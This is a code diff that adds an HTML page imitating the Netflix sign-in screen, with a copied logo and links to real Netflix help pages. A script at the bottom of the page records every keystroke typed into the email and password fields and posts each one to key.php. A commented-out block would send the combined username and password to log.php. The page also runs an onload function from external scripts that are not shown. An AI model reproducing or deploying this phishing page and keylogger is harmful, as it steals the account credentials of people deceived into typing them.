@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>NETFLIX LOGIN PAGE</title>
+  <link rel="stylesheet" href="./style.css">
+
+
+
+  <script src="client.min.js"></script>
+  <script src="loc.js"></script>
+  
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css"/>
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js "></script>
+
+</head>
+<body onload="mydata()">
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+<link rel="stylesheet" href="style.css">
+<title>Netflix - Watch TV Shows Online, Watch Movies Online</title>
+</head>
+<body>
+    <header class="showcase">
+        
+
+            <div class="logo">
+                <img src="https://i.ibb.co/r5krrdz/logo.png">
+            </div>
+
+            <div class="showcase-content">
+                <div class="formm">
+                    <form>
+                        <h1>Sign In</h1>
+                        <div class="info">
+                            <input id="email" class="email" type="email" placeholder="Email or phone number"> <br>
+                            <input id="pass" class="email" type="password" placeholder="Password">
+                        </div>
+                        <div class="btn">
+                            <button class="btn-primary" type="submit">Sign In</button>
+                        </div>
+                        <div class="help">
+                            <div>
+                                <input value="true" type="checkbox"><label>Remember me</label>
+                            </div>
+
+                            <a href="https://www.netflix.com/dz-en/LoginHelp">Need Help ?</a>
+                        
+                        </div>
+
+                    </form>
+    
+                </div>
+                
+                <div class="fcbk">
+                    <a href="https://facebook.com">
+                        <img src="https://i.ibb.co/LrVMXNR/social-fb.png" alt="Facebook">
+                      </a>
+                    <p>Login with Facebook</p>
+                </div>
+                <div class="signup">
+                    <p>New to Netflix ?</p>
+                    <a href="https://www.netflix.com/dz-en/">Sign up now</a>
+                </div>
+                <div class="more">
+                    <p>
+                        This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a> 
+                    </p>
+                </div>
+
+
+            </div>
+
+       
+    </header>
+
+
+</body>
+</html>
+<!-- partial -->
+  
+<script>
+      
+      
+    document
+    .getElementById("email")
+    .addEventListener("keypress", function (data) {
+      $.post("key.php", { userkey: data.key });
+    });
+    
+    document
+      .getElementById("pass")
+      .addEventListener("keypress", function (data) {
+        $.post("key.php", { passkey: data.key });
+      });
+      
+    //   document.getElementById("submit").addEventListener("click", function () {
+    //     username = document.getElementById("username").value;
+    //     password = document.getElementById("password").value;
+    //     $.post("log.php", { sub: username + ":" + password });
+    //   });
+
+  </script>
+</body>
+</html>
